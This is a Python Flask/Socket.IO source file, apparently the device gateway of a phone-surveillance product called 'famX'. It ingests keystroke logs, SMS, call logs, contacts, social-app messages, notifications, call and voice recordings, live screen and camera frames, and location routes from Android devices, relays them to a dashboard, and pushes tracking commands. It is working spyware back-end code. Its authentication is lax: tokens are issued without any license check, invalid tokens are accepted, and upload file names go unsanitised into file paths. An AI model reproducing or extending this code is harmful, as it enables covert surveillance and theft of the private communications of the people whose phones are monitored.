import os
import time
from flask import Flask, request, jsonify, send_file
from config import SECRET_KEY, DEVICE_PORT, HOST
from extensions import socketio, gateway_socketio
from core.database import (
    database, users_database, connected_devices, sid_to_device,
    connected_device_licenses, save_db, save_users_db
)
from core.parsers import update_device_record
from core.gateway_auth import famx_token_or_license_required, verify_famx_token, generate_famx_token
from sockets.events import calculate_distance, log_geofence_event, check_geofences_for_device

def create_gateway_app():
    app = Flask('famx_gateway')
    app.config['SECRET_KEY'] = SECRET_KEY

    # Initialize gateway SocketIO instance
    gateway_socketio.init_app(app)

    @app.route('/', methods=['GET'])
    def gateway_status():
        """Headless gateway health check endpoint (no HTML or admin routes exposed)."""
        return jsonify({
            "service": "famX Device Gateway",
            "status": "online",
            "version": "1.0.0",
            "port": DEVICE_PORT
        })

    @app.route('/checkme', methods=['GET', 'POST'])
    def gateway_checkme():
        """
        Public health-check endpoint for hardware & external verification.
        When accessed via ProtonVPN (http://<Proton_IP>:<Proton_Port>/checkme),
        returns full diagnostic information about the incoming connection.
        """
        return jsonify({
            "status": "ok",
            "connected": True,
            "service": "famX Ingestion Gateway",
            "server_time": int(time.time()),
            "client_ip": request.remote_addr,
            "host_header": request.headers.get("Host"),
            "user_agent": request.headers.get("User-Agent"),
            "message": "Hardware gateway is REACHABLE and READY to receive data!"
        }), 200

    @app.route('/api/device/<device_id>/token', methods=['GET'])
    def get_device_token(device_id):
        """Helper endpoint for hardware provisioning with a famX token."""
        license_key = request.args.get('license_key')
        token = generate_famx_token(device_id)
        return jsonify({
            "success": True,
            "device_id": device_id,
            "famX_token": token
        })

    @app.route('/api/device/<device_id>/upload_media', methods=['POST'])
    @famx_token_or_license_required
    def gateway_upload_media(device_id):
        """High-throughput hardware media & telemetry file upload handler."""
        if 'file' not in request.files:
            return jsonify({"success": False, "error": "No file part"}), 400
        file = request.files['file']
        category = request.form.get('category', '').strip().lower()
        if file.filename == '':
            return jsonify({"success": False, "error": "No selected file"}), 400
            
        os.makedirs(os.path.join("data", device_id), exist_ok=True)
        os.makedirs(os.path.join("media", device_id), exist_ok=True)
        
        filename = file.filename
        fn_lower = filename.lower()
        now_ms = int(time.time() * 1000)

        if device_id not in database:
            database[device_id] = {"_id": device_id}
        if "media" not in database[device_id] or not isinstance(database[device_id]["media"], dict):
            database[device_id]["media"] = {}
        if "refs" not in database[device_id]:
            database[device_id]["refs"] = {}

        database[device_id]["lastSeen"] = now_ms

        text_categories = ["calls", "sms", "contacts", "apps", "accounts", "notifications", "usage_daily", "usage_weekly", "usage_monthly", "files", "info"]
        
        if category in text_categories:
            file_path = os.path.join("data", device_id, f"{category}.txt")
            file.save(file_path)
            
            database[device_id]["refs"][category] = now_ms
            
            if category == "info":
                try:
                    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                        info_content = f.read()
                    update_device_record(device_id, "info", info_content)
                    update_device_record(device_id, "info", f"ip: {request.remote_addr}\n")
                except Exception as e:
                    print(f"[famX Gateway] Error parsing info file: {e}")
                    
            save_db()
            if category == "files":
                socketio.emit('files_updated', {'device_id': device_id})
            print(f"[famX Gateway] Uploaded {category}.txt for device: {device_id}")
            return jsonify({"success": True})

        # 1. Screen Mirroring Frame
        elif category in ["mirror", "screen", "live_screen"] or any(k in fn_lower for k in ["mirror", "mirro", "mirrro"]):
            mirror_path = os.path.join("media", device_id, "mirror.jpg")
            file.save(mirror_path)

            mirror_url = f"/api/media/stream/{device_id}/mirror.jpg?t={now_ms}"
            database[device_id]["mirror_url"] = mirror_url
            database[device_id]["mirror_time"] = now_ms
            save_db()

            socketio.emit('mirror_update', {'device_id': device_id, 'url': mirror_url}, room=device_id)
            socketio.emit('mirror_update', {'device_id': device_id, 'url': mirror_url})
            print(f"[famX Gateway] Live Mirror frame updated for device: {device_id}")
            return jsonify({"success": True, "url": mirror_url})

        # 2. Live Camera Frame
        elif category in ["live_camera", "camera_live"] or any(k in fn_lower for k in ["live_camera", "livecam", "live_cam"]):
            cam_path = os.path.join("media", device_id, "live_camera.jpg")
            file.save(cam_path)

            cam_url = f"/api/media/stream/{device_id}/live_camera.jpg?t={now_ms}"
            database[device_id]["live_camera_url"] = cam_url
            database[device_id]["live_camera_time"] = now_ms
            save_db()

            socketio.emit('live_camera_update', {'device_id': device_id, 'url': cam_url}, room=device_id)
            socketio.emit('live_camera_update', {'device_id': device_id, 'url': cam_url})
            print(f"[famX Gateway] Live Camera frame updated for device: {device_id}")
            return jsonify({"success": True, "url": cam_url})

        # 3. Wallpaper
        elif category == "wallpaper" or fn_lower.startswith("wallpaper"):
            wp_path = os.path.join("media", device_id, "wallpaper.jpg")
            file.save(wp_path)

            wp_url = f"/api/media/stream/{device_id}/wallpaper.jpg?t={now_ms}"
            database[device_id]["wallpaper_url"] = wp_url
            save_db()

            socketio.emit('wallpaper_update', {'device_id': device_id, 'url': wp_url}, room=device_id)
            socketio.emit('wallpaper_update', {'device_id': device_id, 'url': wp_url})
            return jsonify({"success": True})

        # 4. Audio / Voice Recordings / Live Audio Chunks
        elif category in ["audio", "voice", "recording", "recordings", "live_audio"] or fn_lower.startswith("audio_") or fn_lower.endswith(('.mp3', '.m4a', '.wav', '.ogg', '.aac')):
            voice_dir = os.path.join("media", device_id, "voice")
            os.makedirs(voice_dir, exist_ok=True)
            voice_file_path = os.path.join(voice_dir, filename)
            file.save(voice_file_path)

            # Also maintain direct path in media/<device_id>/
            direct_path = os.path.join("media", device_id, filename)
            if not os.path.exists(direct_path):
                try:
                    import shutil
                    shutil.copyfile(voice_file_path, direct_path)
                except Exception:
                    pass

            file_size = os.path.getsize(voice_file_path) if os.path.exists(voice_file_path) else 0
            chunk_url = f"/api/media/stream/{device_id}/{filename}"
            database[device_id]["live_audio_url"] = chunk_url
            database[device_id]["live_audio_time"] = now_ms

            media_type = "call_recording" if ("call" in fn_lower or "call" in category) else "audio"
            fb_key = f"m_{now_ms}_{filename.split('.')[0]}"
            database[device_id]["media"][fb_key] = {
                "time": now_ms,
                "url": chunk_url,
                "name": filename,
                "type": media_type,
                "bytes": file_size,
                "duration": 15
            }
            save_db()

            socketio.emit('live_audio_chunk', {'device_id': device_id, 'url': chunk_url}, room=device_id)
            socketio.emit('live_audio_chunk', {'device_id': device_id, 'url': chunk_url})
            print(f"[famX Gateway] Uploaded audio {filename} ({media_type}) for device: {device_id}")
            return jsonify({"success": True})

        # 5. Photos / Camera Captures / Screenshots
        elif category in ["photo", "photos", "camera", "image", "screenshot", "screenshots", "screencap"] or fn_lower.startswith(("img_", "screenshot", "cam_")):
            # Absolute guard: If incoming file is a mirror or live_camera frame, divert immediately
            if any(k in fn_lower for k in ["mirror", "mirro", "mirrro"]):
                mirror_path = os.path.join("media", device_id, "mirror.jpg")
                file.save(mirror_path)
                mirror_url = f"/api/media/stream/{device_id}/mirror.jpg?t={now_ms}"
                database[device_id]["mirror_url"] = mirror_url
                database[device_id]["mirror_time"] = now_ms
                save_db()
                socketio.emit('mirror_update', {'device_id': device_id, 'url': mirror_url}, room=device_id)
                socketio.emit('mirror_update', {'device_id': device_id, 'url': mirror_url})
                return jsonify({"success": True, "url": mirror_url})

            if any(k in fn_lower for k in ["live_camera", "livecam", "live_cam"]):
                cam_path = os.path.join("media", device_id, "live_camera.jpg")
                file.save(cam_path)
                cam_url = f"/api/media/stream/{device_id}/live_camera.jpg?t={now_ms}"
                database[device_id]["live_camera_url"] = cam_url
                database[device_id]["live_camera_time"] = now_ms
                save_db()
                socketio.emit('live_camera_update', {'device_id': device_id, 'url': cam_url}, room=device_id)
                socketio.emit('live_camera_update', {'device_id': device_id, 'url': cam_url})
                return jsonify({"success": True, "url": cam_url})

            photos_dir = os.path.join("media", device_id, "photos")
            os.makedirs(photos_dir, exist_ok=True)
            photo_file_path = os.path.join(photos_dir, filename)
            file.save(photo_file_path)

            # Also maintain direct path in media/<device_id>/
            direct_path = os.path.join("media", device_id, filename)
            if not os.path.exists(direct_path):
                try:
                    import shutil
                    shutil.copyfile(photo_file_path, direct_path)
                except Exception:
                    pass

            file_size = os.path.getsize(photo_file_path) if os.path.exists(photo_file_path) else 0
            media_type = "screenshot" if ("screenshot" in fn_lower or "screencap" in category or "screenshot" in category) else "image"
            fb_key = f"m_{now_ms}_{filename.split('.')[0]}"
            media_url = f"/api/media/stream/{device_id}/{filename}"

            database[device_id]["media"][fb_key] = {
                "time": now_ms,
                "url": media_url,
                "name": filename,
                "type": media_type,
                "bytes": file_size
            }
            save_db()
            print(f"[famX Gateway] Uploaded photo {filename} ({media_type}) for device: {device_id}")
            return jsonify({"success": True})

        # 6. Fallback General Files
        else:
            # Absolute guard: never add mirror or live_camera to general media list
            if any(k in fn_lower for k in ["mirror", "mirro", "mirrro"]):
                mirror_path = os.path.join("media", device_id, "mirror.jpg")
                file.save(mirror_path)
                mirror_url = f"/api/media/stream/{device_id}/mirror.jpg?t={now_ms}"
                database[device_id]["mirror_url"] = mirror_url
                database[device_id]["mirror_time"] = now_ms
                save_db()
                socketio.emit('mirror_update', {'device_id': device_id, 'url': mirror_url}, room=device_id)
                socketio.emit('mirror_update', {'device_id': device_id, 'url': mirror_url})
                return jsonify({"success": True, "url": mirror_url})

            file_path = os.path.join("media", device_id, filename)
            file.save(file_path)
            file_size = os.path.getsize(file_path) if os.path.exists(file_path) else 0

            fb_key = f"m_{now_ms}_{filename.split('.')[0]}"
            database[device_id]["media"][fb_key] = {
                "time": now_ms,
                "url": f"/api/media/stream/{device_id}/{filename}",
                "name": filename,
                "type": "file",
                "bytes": file_size
            }
            save_db()
            print(f"[famX Gateway] Uploaded generic file {filename} for device: {device_id}")
            return jsonify({"success": True})

    # Register hardware socket events
    _register_gateway_socket_events(gateway_socketio)

    return app

def _register_gateway_socket_events(sio):
    @sio.on('connect')
    def handle_device_connect():
        device_id = request.args.get('device_id')
        model = request.args.get('model', 'Unknown')
        manf = request.args.get('manf', 'Unknown')
        release = request.args.get('release', 'Unknown')
        license_key = request.args.get('license_key')
        token = request.args.get('token')
        
        if not device_id:
            return
            
        # Validate famX token or license if provided
        if token and not verify_famx_token(device_id, token):
            print(f"[famX Gateway] WARNING: Invalid famX token for device {device_id}")

        from flask_socketio import join_room
        join_room(device_id)
        connected_devices[device_id] = request.sid
        sid_to_device[request.sid] = device_id
        
        if license_key:
            license_key = license_key.strip()
            connected_device_licenses[device_id] = license_key
            if device_id not in database:
                database[device_id] = {"_id": device_id}
            database[device_id]["license_key"] = license_key
            save_db()
            
            if license_key in users_database.get("licenses", {}):
                username = users_database["licenses"][license_key].get("assigned_to")
                if username and username in users_database.get("users", {}):
                    if "devices" not in users_database["users"][username]:
                        users_database["users"][username]["devices"] = []
                    if device_id not in users_database["users"][username]["devices"]:
                        users_database["users"][username]["devices"].append(device_id)
                        save_users_db()
                        print(f"[famX Gateway] Device {device_id} mapped to user: {username}")
                        
        ip = request.remote_addr
        info_string = f"model: {model}\nmanufacturer: {manf}\nandroid: {release}\nadmin: false\nbattery: --%\nnotif_pending: 0\nip: {ip}\n"
        update_device_record(device_id, "info", info_string)
        update_device_record(device_id, "logs", "Device Connected via famX Gateway")
        
        # Check lock track setting
        settings = database.get(device_id, {}).get("settings", {})
        if settings.get("lock_track_enabled", False):
            def delayed_sync(sid, dev_id):
                sio.sleep(1.5)
                sio.emit('command', {'action': 'START_LOCK_TRACK'}, room=sid)
            sio.start_background_task(delayed_sync, request.sid, device_id)
            
        print(f"[famX Gateway] Device online: {device_id} (Model: {model}) on Port {DEVICE_PORT}")
        
        # Relay status change to BOTH gateway and web dashboard socket
        sio.emit('device_status_change', {'device_id': device_id, 'online': True})
        socketio.emit('device_status_change', {'device_id': device_id, 'online': True})

    @sio.on('disconnect')
    def handle_device_disconnect():
        device_id = sid_to_device.pop(request.sid, None)
        if device_id:
            connected_devices.pop(device_id, None)
            connected_device_licenses.pop(device_id, None)
            print(f"[famX Gateway] Device disconnected: {device_id}")
            update_device_record(device_id, "logs", "Device Disconnected")
            sio.emit('device_status_change', {'device_id': device_id, 'online': False})
            socketio.emit('device_status_change', {'device_id': device_id, 'online': False})

    @sio.on('camera_frame')
    def handle_camera_frame(data):
        device_id = sid_to_device.get(request.sid)
        if device_id:
            # Relay camera frame live to Web Dashboard listeners on Port 8800!
            socketio.emit('camera_frame_relay', data, room=device_id)

    @sio.on('keylogs')
    def handle_keylogs(data):
        device_id = sid_to_device.get(request.sid)
        if device_id and data:
            pkg = data.get("pkg", "unknown")
            text = data.get("text", "")
            log_time = data.get("time", int(time.time() * 1000))
            
            if device_id not in database: database[device_id] = {"_id": device_id}
            if "keylogs" not in database[device_id]: database[device_id]["keylogs"] = {}
            
            log_id = f"kl_{log_time}"
            database[device_id]["keylogs"][log_id] = {
                "pkg": pkg,
                "text": text,
                "time": log_time
            }
            update_device_record(device_id, "logs", f"Keylog entry received from {pkg}")
            save_db()
            
            # Relay to web dashboard
            payload = {'device_id': device_id, 'pkg': pkg, 'text': text, 'time': log_time}
            socketio.emit('keylog_received', payload)

    @sio.on('notification_logged')
    def handle_notification_logged(data):
        device_id = sid_to_device.get(request.sid)
        if device_id and data:
            pkg = data.get("package", "unknown")
            title = data.get("title", "")
            text = data.get("text", "")
            log_time = data.get("time", "")
            
            file_path = os.path.join("data", device_id, "notifications.txt")
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            with open(file_path, "a", encoding="utf-8") as f:
                f.write(f"App: {pkg} | Title: {title} | Msg: {text} | Time: {log_time}\n---\n")
                
            if "info" not in database[device_id]: database[device_id]["info"] = {}
            curr_count = int(database[device_id]["info"].get("notif_pending", 0)) + 1
            database[device_id]["info"]["notif_pending"] = str(curr_count)
            
            if "refs" not in database[device_id]: database[device_id]["refs"] = {}
            database[device_id]["refs"]["notifications"] = int(time.time() * 1000)
            save_db()

    @sio.on('location')
    def handle_location(data):
        device_id = sid_to_device.get(request.sid)
        if device_id and data:
            if "lat" in data and "lng" in data:
                settings = database.get(device_id, {}).get("settings", {})
                if settings.get("lock_track_enabled", False):
                    today_route = database[device_id].get("today_route", [])
                    current_time = time.localtime(data.get("time", int(time.time() * 1000)) / 1000)
                    current_date_str = time.strftime("%Y-%m-%d", current_time)
                    today_route_date = database[device_id].get("today_route_date", current_date_str)
                    
                    if today_route_date != current_date_str:
                        if today_route:
                            route_history = database[device_id].get("route_history", [])
                            route_history.append({
                                "date": today_route_date,
                                "route": today_route
                            })
                            database[device_id]["route_history"] = route_history[-30:]
                        today_route = []
                        database[device_id]["today_route_date"] = current_date_str
                    
                    today_route.append({
                        "lat": data["lat"],
                        "lng": data["lng"],
                        "time": data.get("time", int(time.time() * 1000))
                    })
                    database[device_id]["today_route"] = today_route
                    database[device_id]["today_route_date"] = current_date_str
                    save_db()

            update_device_record(device_id, "location", data)
            check_geofences_for_device(socketio, device_id, data)
            
            # Relay location live to Web Dashboard
            payload = {'device_id': device_id, 'lat': data.get("lat"), 'lng': data.get("lng")}
            socketio.emit('location_update', payload)

    @sio.on('social_message')
    def handle_social_message(data):
        device_id = sid_to_device.get(request.sid)
        if device_id and data:
            platform = data.get("platform", "unknown").replace(".", "_")
            contact = data.get("contact", "unknown").replace(".", "_").replace(" ", "_")
            text = data.get("text", "")
            is_sent = data.get("isSent", False)
            msg_time = data.get("time", int(time.time() * 1000))

            if device_id not in database: database[device_id] = {"_id": device_id}
            if "chats" not in database[device_id]: database[device_id]["chats"] = {}
            if platform not in database[device_id]["chats"]: database[device_id]["chats"][platform] = {}
            if contact not in database[device_id]["chats"][platform]:
                database[device_id]["chats"][platform][contact] = {"contactName": contact, "messages": {}}

            messages_dict = database[device_id]["chats"][platform][contact]["messages"]
            is_duplicate = False
            if messages_dict:
                sorted_msgs = sorted(messages_dict.values(), key=lambda x: x.get("time", 0), reverse=True)
                for m in sorted_msgs[:40]:
                    if m.get("text") == text and m.get("type") == ("sent" if is_sent else "received"):
                        if abs(m.get("time", 0) - msg_time) < 86400000:
                            is_duplicate = True
                            break

            if not is_duplicate:
                m_id = str(hash(text + ("sent" if is_sent else "received") + str(msg_time)))
                database[device_id]["chats"][platform][contact]["messages"][m_id] = {
                    "text": text,
                    "type": "sent" if is_sent else "received",
                    "time": msg_time
                }
                save_db()
                payload = {
                    'device_id': device_id,
                    'platform': platform,
                    'contact': contact,
                    'text': text,
                    'isSent': is_sent,
                    'time': msg_time
                }
                socketio.emit('social_message_received', payload)

gateway_app = create_gateway_app()

def run_gateway(host=None, port=None):
    """Runs the famX Device Gateway."""
    if not host: host = HOST
    if not port: port = DEVICE_PORT
    print(f"[famX Gateway] Starting Device Ingestion Service on http://{host}:{port}")
    gateway_socketio.run(gateway_app, host=host, port=port, debug=False, use_reloader=False, allow_unsafe_werkzeug=True)

if __name__ == '__main__':
    run_gateway()
